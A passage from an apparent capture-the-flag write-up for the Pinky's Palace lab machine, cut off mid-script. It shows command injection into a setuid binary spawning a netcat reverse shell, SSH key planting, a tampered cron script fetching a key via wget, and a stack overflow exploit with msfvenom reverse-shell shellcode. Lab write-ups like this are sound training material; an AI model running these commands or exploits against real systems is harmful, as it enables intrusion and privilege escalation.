</span>getenv<span class="o">(</span><span class="s2">"TERM"</span><span class="o">)</span>                                                                                       <span class="o">=</span> <span class="s2">"screen"</span>
<span class="nb">printf</span><span class="o">(</span><span class="s2">"[+] Input Password: "</span><span class="o">)</span>                                                                       <span class="o">=</span> 20
__isoc99_scanf<span class="o">(</span>0x55bf60600cb5, 0x7ffd0b68dcd0, 0, 0[+] Input Password: password
<span class="o">)</span>                                                 <span class="o">=</span> 1
strlen<span class="o">(</span><span class="s2">"password"</span><span class="o">)</span>                                                                                   <span class="o">=</span> 8
strcmp<span class="o">(</span><span class="s2">"password"</span>, <span class="s2">"screen"</span><span class="o">)</span>                                                                         <span class="o">=</span> <span class="nt">-3</span>
puts<span class="o">(</span><span class="s2">"[!] Incorrect Password!"</span><span class="o">[!]</span> Incorrect Password!
<span class="o">)</span>                                                                      <span class="o">=</span> 24
<span class="nb">exit</span><span class="o">(</span>0 &lt;no <span class="k">return</span> ...&gt;
+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ltrace ./qsub <span class="nb">test
</span>getenv<span class="o">(</span><span class="s2">"TERM"</span><span class="o">)</span>                                                                                       <span class="o">=</span> <span class="s2">"screen"</span>
<span class="nb">printf</span><span class="o">(</span><span class="s2">"[+] Input Password: "</span><span class="o">)</span>                                                                       <span class="o">=</span> 20
__isoc99_scanf<span class="o">(</span>0x55b9ba000cb5, 0x7fffbc059980, 0, 0[+] Input Password: screen
<span class="o">)</span>                                                 <span class="o">=</span> 1
strlen<span class="o">(</span><span class="s2">"screen"</span><span class="o">)</span>                                                                                     <span class="o">=</span> 6
strcmp<span class="o">(</span><span class="s2">"screen"</span>, <span class="s2">"screen"</span><span class="o">)</span>                                                                           <span class="o">=</span> 0
<span class="nb">printf</span><span class="o">(</span><span class="s2">"[+] Welcome to Question Submit!"</span><span class="o">)</span>                                                            <span class="o">=</span> 31
getegid<span class="o">()</span>                                                                                            <span class="o">=</span> 0
geteuid<span class="o">()</span>                                                                                            <span class="o">=</span> 0
setresgid<span class="o">(</span>0, 0, 0, 0<span class="o">)</span>                                                                                <span class="o">=</span> 0
setresuid<span class="o">(</span>0, 0, 0, 0<span class="o">)</span>                                                                                <span class="o">=</span> 0
asprintf<span class="o">(</span>0x7fffbc059958, 0x55b9ba000c58, 0x7fffbc05b765, 0<span class="o">)</span>                                          <span class="o">=</span> 54
system<span class="o">(</span><span class="s2">"/bin/echo test &gt;&gt; /home/pinky/me"</span>...sh: 1: cannot create /home/pinky/messages/stefano_msg.txt: Directory nonexistent
 &lt;no <span class="k">return</span> ...&gt;
<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
&lt;... system resumed&gt; <span class="o">)</span>                                                                               <span class="o">=</span> 512
<span class="o">[</span>+] Welcome to Question Submit!+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
</code></pre></div></div>

<p>Now that we know how the binary works, we first need to start a netcat listener on port 443 in my case, and execute the following command on the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stefano@Pinkys-Palace:~<span class="nv">$ </span>/home/stefano/tools/qsub <span class="s2">";nc 192.168.179.1 443 -e /bin/bash"</span>
<span class="o">[</span>+] Input Password: screen
</code></pre></div></div>

<p>We have a shell with pinky user privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.178] 51210
script <span class="nt">-qc</span> /bin/bash /dev/null
pinky@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pinky<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>stefano<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>stefano<span class="o">)</span>
pinky@Pinkys-Palace:~<span class="err">$</span>
</code></pre></div></div>

<p>Since we don’t have the necessary privileges to edit the backup file, one way to bypass this is accessing through SSH.</p>

<p>We generate a pair of RSA keys.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh-keygen <span class="nt">-P</span> <span class="s2">"pinkys123"</span> <span class="nt">-f</span> pinky_rsa
</code></pre></div></div>

<p>On the target machine we create the .ssh directory and in it we create the <strong>authorized_keys</strong> file that contains the public key, and grant all privileges to the owner of the file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinky@Pinkys-Palace:/home/pinky<span class="nv">$ </span><span class="nb">mkdir</span> .ssh
<span class="nb">mkdir</span> .ssh
pinky@Pinkys-Palace:/home/pinky<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCXuRltyrlhrthbnt7stOvfbRJ7aTQhbZ2ps/NMT+PMYBKacQOQ3QsLqTCIZ7KfKHp2029+k/8FviS58Zoz6omP6RYhJ8E6Ayt0gUt0e5LKTKTocrvk4dsmK9Qo6EvhlBDet11yabRuXKrH1btxOIfyb8F06lQDodvefg/BBMIk5wwAKVO5/m5kK2uT5wShEZR0bbUdsBEXLMLvPZv9wbrcDDSX9xBzHkYr+adddqqXF+faqt6hfvBri03fEv5Kyb/Txwj7h6PhY5fq5mFdze4XaL0AAY58HLju6cZlQ6P8hIKsms7a5lh7TDo+tfudULt+fK+ZyoEzVXoaRLDlq1CPrioujhs8OTn6mB1tLNNjw2LJW0z/AJDs4evbOFkYmaB6C8QL2TdHxqrZNP4xZ3F7ao8QG6hfrnnyQoLrhnSnH8SQRC4/YyfudiFlph4sVbSpHiQq/byHwAuG42tkT5QEun+/tW1GeYkNgGrC58tRXzvQHLklFniWvvNl7qpEtK8='</span> <span class="o">&gt;</span> .ssh/authorized_keys
<span class="nv">GrC58tRXzvQHLklFniWvvNl7qpEtK8</span><span class="o">=</span><span class="s1">' &gt; .ssh/authorized_keyswAuG42tkT5QEun+/tW1GeYkNgG
pinky@Pinkys-Palace:/home/pinky$ chmod 700 .ssh/authorized_keys
chmod 700 .ssh/authorized_keys
pinky@Pinkys-Palace:/home/pinky$
</span></code></pre></div></div>

<p>We access via SSH as shown below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh pinky@192.168.179.178 <span class="nt">-i</span> pinky_rsa <span class="nt">-p</span> 4655
Enter passphrase <span class="k">for </span>key <span class="s1">'pinky_rsa'</span>: 
Linux Pinkys-Palace 4.9.0-4-amd64 <span class="c">#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pinky@Pinkys-Palace:~<span class="err">$</span>
</code></pre></div></div>

<p>Now, we can edit the backup file, this is a script that is being executed by a cron job.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinky@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /usr/local/bin/backup.sh
<span class="nt">-rwxrwx---</span> 1 demon pinky 113 Mar 17  2018 /usr/local/bin/backup.sh
pinky@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/backup.sh 
<span class="c">#!/bin/bash</span>

<span class="nb">rm</span> /home/demon/backups/backup.tar.gz
<span class="nb">tar </span>cvzf /home/demon/backups/backup.tar.gz /var/www/html
<span class="c">#</span>
<span class="c">#</span>
<span class="c">#</span>
pinky@Pinkys-Palace:~<span class="err">$</span>
</code></pre></div></div>

<p>We add the following instructions to the backup.sh file, this creates the .ssh directory in the demon’s home directory, we download the public key and save it in the .ssh directory, and grant all permissions to the owner.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinky@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'mkdir /home/demon/.ssh &amp;&amp;\     
&gt; wget 192.168.179.1/pinky_rsa.pub -O /home/demon/.ssh/authorized_keys &amp;&amp;\ 
&gt; chmod 700 /home/demon/.ssh/authorized_keys'</span> <span class="o">&gt;&gt;</span> /usr/local/bin/backup.sh
</code></pre></div></div>

<p>Then, we start a python web server on port 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>We wait a few minutes, and log in via SSH as user demon.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh demon@192.168.179.178 <span class="nt">-i</span> pinky_rsa <span class="nt">-p</span> 4655
Enter passphrase <span class="k">for </span>key <span class="s1">'pinky_rsa'</span>: 
Linux Pinkys-Palace 4.9.0-4-amd64 <span class="c">#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
demon@Pinkys-Palace:~<span class="err">$</span>
</code></pre></div></div>

<p>By listing the writable files was found a rare binary, which also runs with root permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>demon@Pinkys-Palace:~<span class="nv">$ </span>find / <span class="nt">-writable</span> <span class="nt">-type</span> f 2&gt;/dev/null | egrep <span class="nt">-v</span> <span class="s1">'sys|proc'</span>
/daemon/panel
...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>demon@Pinkys-Palace:~<span class="nv">$ </span>ps aux | <span class="nb">grep</span> /daemon/panel | <span class="nb">head</span> <span class="nt">-n</span> +2
root        479  0.0  0.1   4040   736 ?        Ss   17:58   0:00 /daemon/panel
root        483  0.0  0.0   4040    84 ?        S    17:58   0:00 /daemon/panel
</code></pre></div></div>

<p>We download it to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>scp <span class="nt">-P</span> 4655 <span class="nt">-i</span> pinky_rsa demon@192.168.179.178:/daemon/panel panel 
Enter passphrase <span class="k">for </span>key <span class="s1">'pinky_rsa'</span>: 
panel                                                           100%   13KB   2.9MB/s   00:00 
</code></pre></div></div>

<p>We grant execution permissions, and execute the binary.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">chmod</span> +x panel
root@kali:~<span class="nv">$ </span>./panel

</code></pre></div></div>

<p>We see that is running locally on port 31337, as on the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>ss <span class="nt">-ntpl</span>
LISTEN         0              5                            0.0.0.0:31337                      0.0.0.0:<span class="k">*</span>            <span class="nb">users</span>:<span class="o">((</span><span class="s2">"panel"</span>,pid<span class="o">=</span>18376,fd<span class="o">=</span>3<span class="o">))</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="binary-exploitation">Binary Exploitation</h3>

<p>With gdb we disassemble the binary and list the functions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gdb <span class="nt">-q</span> ./panel
Reading symbols from ./panel...
<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./panel<span class="o">)</span>
gdb-peda<span class="nv">$ </span>info functions
All defined functions:

Non-debugging symbols:
0x0000000000400718  _init
0x0000000000400740  recv@plt
0x0000000000400750  strcpy@plt
0x0000000000400760  setsockopt@plt
0x0000000000400770  strlen@plt
0x0000000000400780  htons@plt
0x0000000000400790  send@plt
0x00000000004007a0  <span class="nb">printf</span>@plt
0x00000000004007b0  memset@plt
0x00000000004007c0  close@plt
0x00000000004007d0  listen@plt
0x00000000004007e0  <span class="nb">bind</span>@plt
0x00000000004007f0  accept@plt
0x0000000000400800  <span class="nb">exit</span>@plt
0x0000000000400810  <span class="nb">wait</span>@plt
0x0000000000400820  fork@plt
0x0000000000400830  socket@plt
0x0000000000400840  _start
0x0000000000400870  deregister_tm_clones
0x00000000004008b0  register_tm_clones
0x00000000004008f0  __do_global_dtors_aux
0x0000000000400910  frame_dummy
0x0000000000400936  fatal
0x0000000000400964  handlecmd
0x00000000004009ab  main
0x0000000000400b90  __libc_csu_init
0x0000000000400c00  __libc_csu_fini
0x0000000000400c04  _fini
</code></pre></div></div>

<p>The <strong>handlecmd</strong> function in probably taking user input, we disassemble this function to see what it contains.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>disas handlecmd
Dump of assembler code <span class="k">for function </span>handlecmd:
   0x0000000000400964 &lt;+0&gt;:     push   rbp
   0x0000000000400965 &lt;+1&gt;:     mov    rbp,rsp
   0x0000000000400968 &lt;+4&gt;:     add    rsp,0xffffffffffffff80
   0x000000000040096c &lt;+8&gt;:     mov    QWORD PTR <span class="o">[</span>rbp-0x78],rdi
   0x0000000000400970 &lt;+12&gt;:    mov    DWORD PTR <span class="o">[</span>rbp-0x7c],esi
   0x0000000000400973 &lt;+15&gt;:    mov    rdx,QWORD PTR <span class="o">[</span>rbp-0x78]
   0x0000000000400977 &lt;+19&gt;:    lea    rax,[rbp-0x70]
   0x000000000040097b &lt;+23&gt;:    mov    rsi,rdx
   0x000000000040097e &lt;+26&gt;:    mov    rdi,rax
   0x0000000000400981 &lt;+29&gt;:    call   0x400750 &lt;strcpy@plt&gt;
   0x0000000000400986 &lt;+34&gt;:    lea    rax,[rbp-0x70]
   0x000000000040098a &lt;+38&gt;:    mov    rdi,rax
   0x000000000040098d &lt;+41&gt;:    call   0x400770 &lt;strlen@plt&gt;
   0x0000000000400992 &lt;+46&gt;:    mov    rdx,rax
   0x0000000000400995 &lt;+49&gt;:    lea    rsi,[rbp-0x70]
   0x0000000000400999 &lt;+53&gt;:    mov    eax,DWORD PTR <span class="o">[</span>rbp-0x7c]
   0x000000000040099c &lt;+56&gt;:    mov    ecx,0x0
   0x00000000004009a1 &lt;+61&gt;:    mov    edi,eax
   0x00000000004009a3 &lt;+63&gt;:    call   0x400790 &lt;send@plt&gt;
   0x00000000004009a8 &lt;+68&gt;:    nop
   0x00000000004009a9 &lt;+69&gt;:    leave  
   0x00000000004009aa &lt;+70&gt;:    ret
</code></pre></div></div>

<p>We can see the vulnerable function <strong>strcpy</strong>, I will try to cause a crash by sending a string of 200 characters, in gdb-peda it is possible to generate a string with a specified length, and locate the <strong>rip</strong> instruction.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_create 200                                                                                                                                        
<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAU
AArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'</span>  
</code></pre></div></div>

<p>I wrote a python script to send this string of 200 bytes.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>

<span class="n">buf</span><span class="o">=</span> <span class="s">"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin'</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Error"</span><span class="p">)</span>
</code></pre></div></div>

<p>We run the <strong>panel</strong> binary in gdb-peda.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run                                            
Starting program: /root/pinkyspalace2/panel              
<span class="o">[</span>Attaching after process 197786 fork to child process 197796]
<span class="o">[</span>New inferior 2 <span class="o">(</span>process 197796<span class="o">)]</span>                    
<span class="o">[</span>Detaching after fork from parent process 197786]    
<span class="o">[</span>Inferior 1 <span class="o">(</span>process 197786<span class="o">)</span> detached]
Thread 2.1 <span class="s2">"panel"</span> received signal SIGSEGV, Segmentation fault.                                                                                                     
<span class="o">[</span>Switching to process 197796]                                                                                                                                       
</code></pre></div></div>

<p>We run the script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 fuzz.py             
Done
</code></pre></div></div>

<p>As we can see this has caused a segmentation fault, also we can locate the exactly length to overwrite the return address.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>                                                                                    
RAX: 0xc8                                                                                                                                                           
RBX: 0x0                                                                                                                                                            
RCX: 0x7ffff7ee5e7c <span class="o">(</span>&lt;__libc_send+28&gt;:  cmp    rax,0xfffffffffffff000<span class="o">)</span>                                                                                              
RDX: 0xc8                                                                                                                                                           
RSI: 0x7fffffffd2d0 <span class="o">(</span><span class="s2">"AAA%AAsAABAA</span><span class="nv">$AAnAACAA</span><span class="s2">-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAm
AARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>                                                                                                        
RDI: 0x4                                                                                                                                                            
RBP: 0x41414e4141384141 <span class="o">(</span><span class="s1">'AA8AANAA'</span><span class="o">)</span>                                                                                                                                
RSP: 0x7fffffffd348 <span class="o">(</span><span class="s2">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
RIP: 0x4009aa <span class="o">(</span>&lt;handlecmd+70&gt;:  ret<span class="o">)</span>
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x400840 <span class="o">(</span>&lt;_start&gt;:        xor    ebp,ebp<span class="o">)</span>
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10203 <span class="o">(</span>CARRY parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
   0x4009a3 &lt;handlecmd+63&gt;:     call   0x400790 &lt;send@plt&gt;
   0x4009a8 &lt;handlecmd+68&gt;:     nop
   0x4009a9 &lt;handlecmd+69&gt;:     leave  
<span class="o">=&gt;</span> 0x4009aa &lt;handlecmd+70&gt;:     ret    
   0x4009ab &lt;main&gt;:     push   rbp
   0x4009ac &lt;main+1&gt;:   mov    rbp,rsp
   0x4009af &lt;main+4&gt;:   sub    rsp,0x1050
   0x4009b6 &lt;main+11&gt;:  call   0x400820 &lt;fork@plt&gt;
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0x7fffffffd348 <span class="o">(</span><span class="s2">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0008| 0x7fffffffd350 <span class="o">(</span><span class="s2">"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0016| 0x7fffffffd358 <span class="o">(</span><span class="s2">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0024| 0x7fffffffd360 <span class="o">(</span><span class="s2">"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0032| 0x7fffffffd368 <span class="o">(</span><span class="s2">"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0040| 0x7fffffffd370 <span class="o">(</span><span class="s2">"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0048| 0x7fffffffd378 <span class="o">(</span><span class="s2">"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0056| 0x7fffffffd380 <span class="o">(</span><span class="s2">"AuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004009aa <span class="k">in </span>handlecmd <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<p>We locate the exact offset at 120 bytes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120
</code></pre></div></div>

<p>We run the binary again in gdb-peda.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gdb <span class="nt">-q</span> ./panel
Reading symbols from ./panel...           
<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./panel<span class="o">)</span>   
gdb-peda<span class="nv">$ </span>r                               
Starting program: /root/pinkyspalace2/panel
<span class="o">[</span>Attaching after process 10265 fork to child process 10269]
<span class="o">[</span>New inferior 2 <span class="o">(</span>process 10269<span class="o">)]</span>                       
<span class="o">[</span>Detaching after fork from parent process 10265]       
<span class="o">[</span>Inferior 1 <span class="o">(</span>process 10265<span class="o">)</span> detached] 
</code></pre></div></div>

<p>We rebuild the python script, this time adding the offset with 120 A’s and then with 6 B’s, to check if we take control of the return address.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>

<span class="n">buf</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">120</span> <span class="o">+</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">6</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin'</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Error"</span><span class="p">)</span>
</code></pre></div></div>

<p>We run the script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 fuzz.py             
Done
</code></pre></div></div>

<p>As we can see the stack is overwritten with A’s (41 hex equivalent), and the instruction pinter with 6 B’s (42 hex equivalent).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/40wx <span class="nv">$rsp</span>
0x7fffffffd350: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd360: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd370: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd380: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd390: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3a0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3b0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3c0: 0x41414141      0x41414141      0x42424242      0x00004242
0x7fffffffd3d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffd3e0: 0x00000000      0x00000000      0x00000000      0x00000000
gdb-peda<span class="nv">$ </span>x/wx <span class="nv">$rip</span>
0x424242424242: Cannot access memory at address 0x424242424242
</code></pre></div></div>

<p>Then, we find the address <strong>0x400cfb</strong> which jumps to the stack.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>jmpcall 
0x400728 : call rax
0x400895 : jmp rax
0x4008e3 : jmp rax
0x40092e : call rax
0x400cfb : call rsp
0x400d6b : call <span class="o">[</span>rax]
</code></pre></div></div>

<p>The next step is to generate a shellcode of no more than 120 bytes, luckily for us the following msfvenom command generated a shellcode of 119 bytes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">--platform</span> linux <span class="nt">-a</span> x64 <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.179.1 <span class="nv">lport</span><span class="o">=</span>443 <span class="nt">-e</span> x64/xor <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> py <span class="nt">-o</span> shellcode
</code></pre></div></div>

<p>We rebuild our shellcode again adding first 1 NOP (\x90), then the shellcode (119 bytes), and finally the <strong>call rsp</strong> address, as shown in the following script.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"192.168.179.178"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>

<span class="n">buf</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xef\xff\xff\xff\x48\xbb\x40\xb0\xfc\x68\x52\x27\xde</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xcb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x2a\x99\xa4\xf1\x38\x25\x81\xa1\x41\xee\xf3\x6d\x1a</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xb0\x96\x72\x42\xb0\xfd\xd3\x92\x8f\x6d\xca\x11\xf8</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x75\x8e\x38\x37\x84\xa1\x6a\xe8\xf3\x6d\x38\x24\x80</span><span class="s">"</span>
